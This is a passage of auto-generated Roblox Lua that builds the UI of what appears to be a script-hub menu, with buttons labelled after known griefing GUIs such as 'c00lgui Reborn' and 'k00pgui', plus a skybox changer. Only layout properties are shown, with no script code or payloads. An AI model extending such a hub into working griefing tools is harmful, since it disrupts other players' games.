--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RemoteEvent
G2L["74"].Name = [[RemoteEvent]]
G2L["74"].Parent = G2L["64"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.Script
G2L["75"].Name = [[Script]]
G2L["75"].Parent = G2L["64"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd
G2L["76"].Name = [[EP1C GUI REBORN BY mmfv1 and k00pkidd]]
G2L["76"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["76"].Text = [[EP1C GUI REBORN BY mmfv1 and k00pkidd]]
G2L["76"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["76"].TextScaled = true
G2L["76"].TextSize = 14
G2L["76"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["76"].TextStrokeTransparency = 1
G2L["76"].TextWrapped = true
G2L["76"].TextXAlignment = Enum.TextXAlignment.Center
G2L["76"].TextYAlignment = Enum.TextYAlignment.Center
G2L["76"].Active = true
G2L["76"].AnchorPoint = Vector2.new(0, 0)
G2L["76"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["76"].BackgroundTransparency = 0.5
G2L["76"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["76"].BorderSizePixel = 0
G2L["76"].ClipsDescendants = false
G2L["76"].Draggable = false
G2L["76"].Position = UDim2.new(0, 0, 0, 0)
G2L["76"].Rotation = 0
G2L["76"].Selectable = true
G2L["76"].SelectionOrder = 0
G2L["76"].Size = UDim2.new(0, 200, 0, 50)
G2L["76"].Visible = true
G2L["76"].ZIndex = 1
G2L["76"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.TextButton_Roundify_12px
G2L["77"].Name = [[TextButton_Roundify_12px]]
G2L["77"].Image = [[rbxassetid://3570695787]]
G2L["77"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["77"].ScaleType = Enum.ScaleType.Slice
G2L["77"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["77"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["77"].Active = true
G2L["77"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["77"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["77"].BackgroundTransparency = 1
G2L["77"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["77"].BorderSizePixel = 1
G2L["77"].ClipsDescendants = false
G2L["77"].Draggable = false
G2L["77"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["77"].Rotation = 0
G2L["77"].Selectable = true
G2L["77"].SelectionOrder = 0
G2L["77"].Size = UDim2.new(1, 0, 1, 0)
G2L["77"].Visible = true
G2L["77"].ZIndex = 1
G2L["77"].Parent = G2L["76"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.RippleClick
G2L["78"].Name = [[RippleClick]]
G2L["78"].Parent = G2L["76"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.RippleClick.Circle
G2L["79"].Name = [[Circle]]
G2L["79"].Image = [[rbxassetid://266543268]]
G2L["79"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["79"].ScaleType = Enum.ScaleType.Stretch
G2L["79"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["79"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["79"].Active = false
G2L["79"].AnchorPoint = Vector2.new(0, 0)
G2L["79"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["79"].BackgroundTransparency = 1
G2L["79"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["79"].BorderSizePixel = 1
G2L["79"].ClipsDescendants = false
G2L["79"].Draggable = false
G2L["79"].Position = UDim2.new(0, 0, 0, 0)
G2L["79"].Rotation = 0
G2L["79"].Selectable = false
G2L["79"].SelectionOrder = 0
G2L["79"].Size = UDim2.new(0, 0, 0, 0)
G2L["79"].Visible = true
G2L["79"].ZIndex = 10
G2L["79"].Parent = G2L["78"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.UICorner
G2L["80"].Name = [[UICorner]]
G2L["80"].CornerRadius = UDim.new(0, 10)
G2L["80"].Parent = G2L["76"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.ServerEventHandler
G2L["81"].Name = [[ServerEventHandler]]
G2L["81"].Parent = G2L["76"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder
G2L["82"].Name = [[shadowHolder]]
G2L["82"].Active = false
G2L["82"].AnchorPoint = Vector2.new(0, 0)
G2L["82"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["82"].BackgroundTransparency = 1
G2L["82"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["82"].BorderSizePixel = 1
G2L["82"].ClipsDescendants = false
G2L["82"].Draggable = false
G2L["82"].Position = UDim2.new(0, 0, 0, 0)
G2L["82"].Rotation = 0
G2L["82"].Selectable = false
G2L["82"].SelectionOrder = 0
G2L["82"].Size = UDim2.new(1, 0, 1, 0)
G2L["82"].Visible = true
G2L["82"].ZIndex = -1
G2L["82"].Parent = G2L["76"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder.umbraShadow
G2L["83"].Name = [[umbraShadow]]
G2L["83"].Image = [[rbxassetid://1316045217]]
G2L["83"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["83"].ScaleType = Enum.ScaleType.Slice
G2L["83"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["83"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["83"].Active = false
G2L["83"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["83"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["83"].BackgroundTransparency = 1
G2L["83"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["83"].BorderSizePixel = 1
G2L["83"].ClipsDescendants = false
G2L["83"].Draggable = false
G2L["83"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["83"].Rotation = 0
G2L["83"].Selectable = false
G2L["83"].SelectionOrder = 0
G2L["83"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["83"].Visible = true
G2L["83"].ZIndex = 1
G2L["83"].Parent = G2L["82"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder.penumbraShadow
G2L["84"].Name = [[penumbraShadow]]
G2L["84"].Image = [[rbxassetid://1316045217]]
G2L["84"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["84"].ScaleType = Enum.ScaleType.Slice
G2L["84"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["84"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["84"].Active = false
G2L["84"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["84"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["84"].BackgroundTransparency = 1
G2L["84"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["84"].BorderSizePixel = 1
G2L["84"].ClipsDescendants = false
G2L["84"].Draggable = false
G2L["84"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["84"].Rotation = 0
G2L["84"].Selectable = false
G2L["84"].SelectionOrder = 0
G2L["84"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["84"].Visible = true
G2L["84"].ZIndex = 1
G2L["84"].Parent = G2L["82"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.EP1C GUI REBORN BY mmfv1 and k00pkidd.shadowHolder.ambientShadow
G2L["85"].Name = [[ambientShadow]]
G2L["85"].Image = [[rbxassetid://1316045217]]
G2L["85"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["85"].ScaleType = Enum.ScaleType.Slice
G2L["85"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["85"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["85"].Active = false
G2L["85"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["85"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["85"].BackgroundTransparency = 1
G2L["85"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["85"].BorderSizePixel = 1
G2L["85"].ClipsDescendants = false
G2L["85"].Draggable = false
G2L["85"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["85"].Rotation = 0
G2L["85"].Selectable = false
G2L["85"].SelectionOrder = 0
G2L["85"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["85"].Visible = true
G2L["85"].ZIndex = 1
G2L["85"].Parent = G2L["82"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed
G2L["86"].Name = [[c00lgui Reborn RC7 Fixed]]
G2L["86"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["86"].Text = [[c00lgui Reborn RC7 Fixed]]
G2L["86"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["86"].TextScaled = true
G2L["86"].TextSize = 14
G2L["86"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["86"].TextStrokeTransparency = 1
G2L["86"].TextWrapped = true
G2L["86"].TextXAlignment = Enum.TextXAlignment.Center
G2L["86"].TextYAlignment = Enum.TextYAlignment.Center
G2L["86"].Active = true
G2L["86"].AnchorPoint = Vector2.new(0, 0)
G2L["86"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["86"].BackgroundTransparency = 0.5
G2L["86"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["86"].BorderSizePixel = 0
G2L["86"].ClipsDescendants = false
G2L["86"].Draggable = false
G2L["86"].Position = UDim2.new(0, 0, 0, 0)
G2L["86"].Rotation = 0
G2L["86"].Selectable = true
G2L["86"].SelectionOrder = 0
G2L["86"].Size = UDim2.new(0, 200, 0, 50)
G2L["86"].Visible = true
G2L["86"].ZIndex = 1
G2L["86"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.TextButton_Roundify_12px
G2L["87"].Name = [[TextButton_Roundify_12px]]
G2L["87"].Image = [[rbxassetid://3570695787]]
G2L["87"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["87"].ScaleType = Enum.ScaleType.Slice
G2L["87"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["87"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["87"].Active = true
G2L["87"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["87"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["87"].BackgroundTransparency = 1
G2L["87"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["87"].BorderSizePixel = 1
G2L["87"].ClipsDescendants = false
G2L["87"].Draggable = false
G2L["87"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["87"].Rotation = 0
G2L["87"].Selectable = true
G2L["87"].SelectionOrder = 0
G2L["87"].Size = UDim2.new(1, 0, 1, 0)
G2L["87"].Visible = true
G2L["87"].ZIndex = 1
G2L["87"].Parent = G2L["86"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.RippleClick
G2L["88"].Name = [[RippleClick]]
G2L["88"].Parent = G2L["86"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.RippleClick.Circle
G2L["89"].Name = [[Circle]]
G2L["89"].Image = [[rbxassetid://266543268]]
G2L["89"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["89"].ScaleType = Enum.ScaleType.Stretch
G2L["89"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["89"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["89"].Active = false
G2L["89"].AnchorPoint = Vector2.new(0, 0)
G2L["89"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["89"].BackgroundTransparency = 1
G2L["89"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["89"].BorderSizePixel = 1
G2L["89"].ClipsDescendants = false
G2L["89"].Draggable = false
G2L["89"].Position = UDim2.new(0, 0, 0, 0)
G2L["89"].Rotation = 0
G2L["89"].Selectable = false
G2L["89"].SelectionOrder = 0
G2L["89"].Size = UDim2.new(0, 0, 0, 0)
G2L["89"].Visible = true
G2L["89"].ZIndex = 10
G2L["89"].Parent = G2L["88"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.UICorner
G2L["90"].Name = [[UICorner]]
G2L["90"].CornerRadius = UDim.new(0, 10)
G2L["90"].Parent = G2L["86"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.ServerEventHandler
G2L["91"].Name = [[ServerEventHandler]]
G2L["91"].Parent = G2L["86"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder
G2L["92"].Name = [[shadowHolder]]
G2L["92"].Active = false
G2L["92"].AnchorPoint = Vector2.new(0, 0)
G2L["92"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["92"].BackgroundTransparency = 1
G2L["92"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["92"].BorderSizePixel = 1
G2L["92"].ClipsDescendants = false
G2L["92"].Draggable = false
G2L["92"].Position = UDim2.new(0, 0, 0, 0)
G2L["92"].Rotation = 0
G2L["92"].Selectable = false
G2L["92"].SelectionOrder = 0
G2L["92"].Size = UDim2.new(1, 0, 1, 0)
G2L["92"].Visible = true
G2L["92"].ZIndex = -1
G2L["92"].Parent = G2L["86"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder.umbraShadow
G2L["93"].Name = [[umbraShadow]]
G2L["93"].Image = [[rbxassetid://1316045217]]
G2L["93"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["93"].ScaleType = Enum.ScaleType.Slice
G2L["93"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["93"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["93"].Active = false
G2L["93"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["93"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["93"].BackgroundTransparency = 1
G2L["93"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["93"].BorderSizePixel = 1
G2L["93"].ClipsDescendants = false
G2L["93"].Draggable = false
G2L["93"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["93"].Rotation = 0
G2L["93"].Selectable = false
G2L["93"].SelectionOrder = 0
G2L["93"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["93"].Visible = true
G2L["93"].ZIndex = 1
G2L["93"].Parent = G2L["92"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder.penumbraShadow
G2L["94"].Name = [[penumbraShadow]]
G2L["94"].Image = [[rbxassetid://1316045217]]
G2L["94"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["94"].ScaleType = Enum.ScaleType.Slice
G2L["94"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["94"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["94"].Active = false
G2L["94"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["94"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["94"].BackgroundTransparency = 1
G2L["94"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["94"].BorderSizePixel = 1
G2L["94"].ClipsDescendants = false
G2L["94"].Draggable = false
G2L["94"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["94"].Rotation = 0
G2L["94"].Selectable = false
G2L["94"].SelectionOrder = 0
G2L["94"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["94"].Visible = true
G2L["94"].ZIndex = 1
G2L["94"].Parent = G2L["92"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.c00lgui Reborn RC7 Fixed.shadowHolder.ambientShadow
G2L["95"].Name = [[ambientShadow]]
G2L["95"].Image = [[rbxassetid://1316045217]]
G2L["95"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["95"].ScaleType = Enum.ScaleType.Slice
G2L["95"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["95"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["95"].Active = false
G2L["95"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["95"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["95"].BackgroundTransparency = 1
G2L["95"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["95"].BorderSizePixel = 1
G2L["95"].ClipsDescendants = false
G2L["95"].Draggable = false
G2L["95"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["95"].Rotation = 0
G2L["95"].Selectable = false
G2L["95"].SelectionOrder = 0
G2L["95"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["95"].Visible = true
G2L["95"].ZIndex = 1
G2L["95"].Parent = G2L["92"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot
G2L["96"].Name = [[Become Dreamybull omaygot]]
G2L["96"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["96"].Text = [[Become Dreamybull omaygot]]
G2L["96"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["96"].TextScaled = true
G2L["96"].TextSize = 14
G2L["96"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["96"].TextStrokeTransparency = 1
G2L["96"].TextWrapped = true
G2L["96"].TextXAlignment = Enum.TextXAlignment.Center
G2L["96"].TextYAlignment = Enum.TextYAlignment.Center
G2L["96"].Active = true
G2L["96"].AnchorPoint = Vector2.new(0, 0)
G2L["96"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["96"].BackgroundTransparency = 0.5
G2L["96"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["96"].BorderSizePixel = 0
G2L["96"].ClipsDescendants = false
G2L["96"].Draggable = false
G2L["96"].Position = UDim2.new(0, 0, 0, 0)
G2L["96"].Rotation = 0
G2L["96"].Selectable = true
G2L["96"].SelectionOrder = 0
G2L["96"].Size = UDim2.new(0, 200, 0, 50)
G2L["96"].Visible = true
G2L["96"].ZIndex = 1
G2L["96"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.TextButton_Roundify_12px
G2L["97"].Name = [[TextButton_Roundify_12px]]
G2L["97"].Image = [[rbxassetid://3570695787]]
G2L["97"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["97"].ScaleType = Enum.ScaleType.Slice
G2L["97"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["97"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["97"].Active = true
G2L["97"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["97"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["97"].BackgroundTransparency = 1
G2L["97"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["97"].BorderSizePixel = 1
G2L["97"].ClipsDescendants = false
G2L["97"].Draggable = false
G2L["97"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["97"].Rotation = 0
G2L["97"].Selectable = true
G2L["97"].SelectionOrder = 0
G2L["97"].Size = UDim2.new(1, 0, 1, 0)
G2L["97"].Visible = true
G2L["97"].ZIndex = 1
G2L["97"].Parent = G2L["96"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.RippleClick
G2L["98"].Name = [[RippleClick]]
G2L["98"].Parent = G2L["96"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.RippleClick.Circle
G2L["99"].Name = [[Circle]]
G2L["99"].Image = [[rbxassetid://266543268]]
G2L["99"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["99"].ScaleType = Enum.ScaleType.Stretch
G2L["99"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["99"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["99"].Active = false
G2L["99"].AnchorPoint = Vector2.new(0, 0)
G2L["99"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["99"].BackgroundTransparency = 1
G2L["99"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["99"].BorderSizePixel = 1
G2L["99"].ClipsDescendants = false
G2L["99"].Draggable = false
G2L["99"].Position = UDim2.new(0, 0, 0, 0)
G2L["99"].Rotation = 0
G2L["99"].Selectable = false
G2L["99"].SelectionOrder = 0
G2L["99"].Size = UDim2.new(0, 0, 0, 0)
G2L["99"].Visible = true
G2L["99"].ZIndex = 10
G2L["99"].Parent = G2L["98"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.UICorner
G2L["100"].Name = [[UICorner]]
G2L["100"].CornerRadius = UDim.new(0, 10)
G2L["100"].Parent = G2L["96"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.ServerEventHandler
G2L["101"].Name = [[ServerEventHandler]]
G2L["101"].Parent = G2L["96"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder
G2L["102"].Name = [[shadowHolder]]
G2L["102"].Active = false
G2L["102"].AnchorPoint = Vector2.new(0, 0)
G2L["102"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["102"].BackgroundTransparency = 1
G2L["102"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["102"].BorderSizePixel = 1
G2L["102"].ClipsDescendants = false
G2L["102"].Draggable = false
G2L["102"].Position = UDim2.new(0, 0, 0, 0)
G2L["102"].Rotation = 0
G2L["102"].Selectable = false
G2L["102"].SelectionOrder = 0
G2L["102"].Size = UDim2.new(1, 0, 1, 0)
G2L["102"].Visible = true
G2L["102"].ZIndex = -1
G2L["102"].Parent = G2L["96"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder.umbraShadow
G2L["103"].Name = [[umbraShadow]]
G2L["103"].Image = [[rbxassetid://1316045217]]
G2L["103"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["103"].ScaleType = Enum.ScaleType.Slice
G2L["103"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["103"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["103"].Active = false
G2L["103"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["103"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["103"].BackgroundTransparency = 1
G2L["103"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["103"].BorderSizePixel = 1
G2L["103"].ClipsDescendants = false
G2L["103"].Draggable = false
G2L["103"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["103"].Rotation = 0
G2L["103"].Selectable = false
G2L["103"].SelectionOrder = 0
G2L["103"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["103"].Visible = true
G2L["103"].ZIndex = 1
G2L["103"].Parent = G2L["102"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder.penumbraShadow
G2L["104"].Name = [[penumbraShadow]]
G2L["104"].Image = [[rbxassetid://1316045217]]
G2L["104"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["104"].ScaleType = Enum.ScaleType.Slice
G2L["104"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["104"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["104"].Active = false
G2L["104"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["104"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["104"].BackgroundTransparency = 1
G2L["104"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["104"].BorderSizePixel = 1
G2L["104"].ClipsDescendants = false
G2L["104"].Draggable = false
G2L["104"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["104"].Rotation = 0
G2L["104"].Selectable = false
G2L["104"].SelectionOrder = 0
G2L["104"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["104"].Visible = true
G2L["104"].ZIndex = 1
G2L["104"].Parent = G2L["102"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become Dreamybull omaygot.shadowHolder.ambientShadow
G2L["105"].Name = [[ambientShadow]]
G2L["105"].Image = [[rbxassetid://1316045217]]
G2L["105"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["105"].ScaleType = Enum.ScaleType.Slice
G2L["105"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["105"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["105"].Active = false
G2L["105"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["105"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["105"].BackgroundTransparency = 1
G2L["105"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["105"].BorderSizePixel = 1
G2L["105"].ClipsDescendants = false
G2L["105"].Draggable = false
G2L["105"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["105"].Rotation = 0
G2L["105"].Selectable = false
G2L["105"].SelectionOrder = 0
G2L["105"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["105"].Visible = true
G2L["105"].ZIndex = 1
G2L["105"].Parent = G2L["102"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11
G2L["106"].Name = [[Funni Skybox!11]]
G2L["106"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["106"].Text = [[Funni Skybox!11]]
G2L["106"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["106"].TextScaled = true
G2L["106"].TextSize = 14
G2L["106"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["106"].TextStrokeTransparency = 1
G2L["106"].TextWrapped = true
G2L["106"].TextXAlignment = Enum.TextXAlignment.Center
G2L["106"].TextYAlignment = Enum.TextYAlignment.Center
G2L["106"].Active = true
G2L["106"].AnchorPoint = Vector2.new(0, 0)
G2L["106"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["106"].BackgroundTransparency = 0.5
G2L["106"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["106"].BorderSizePixel = 0
G2L["106"].ClipsDescendants = false
G2L["106"].Draggable = false
G2L["106"].Position = UDim2.new(0, 0, 0, 0)
G2L["106"].Rotation = 0
G2L["106"].Selectable = true
G2L["106"].SelectionOrder = 0
G2L["106"].Size = UDim2.new(0, 200, 0, 50)
G2L["106"].Visible = true
G2L["106"].ZIndex = 1
G2L["106"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.TextButton_Roundify_12px
G2L["107"].Name = [[TextButton_Roundify_12px]]
G2L["107"].Image = [[rbxassetid://3570695787]]
G2L["107"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["107"].ScaleType = Enum.ScaleType.Slice
G2L["107"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["107"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["107"].Active = true
G2L["107"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["107"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["107"].BackgroundTransparency = 1
G2L["107"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["107"].BorderSizePixel = 1
G2L["107"].ClipsDescendants = false
G2L["107"].Draggable = false
G2L["107"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["107"].Rotation = 0
G2L["107"].Selectable = true
G2L["107"].SelectionOrder = 0
G2L["107"].Size = UDim2.new(1, 0, 1, 0)
G2L["107"].Visible = true
G2L["107"].ZIndex = 1
G2L["107"].Parent = G2L["106"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.RippleClick
G2L["108"].Name = [[RippleClick]]
G2L["108"].Parent = G2L["106"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.RippleClick.Circle
G2L["109"].Name = [[Circle]]
G2L["109"].Image = [[rbxassetid://266543268]]
G2L["109"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["109"].ScaleType = Enum.ScaleType.Stretch
G2L["109"].SliceCenter = Rect.new(0, 0, 0, 0)
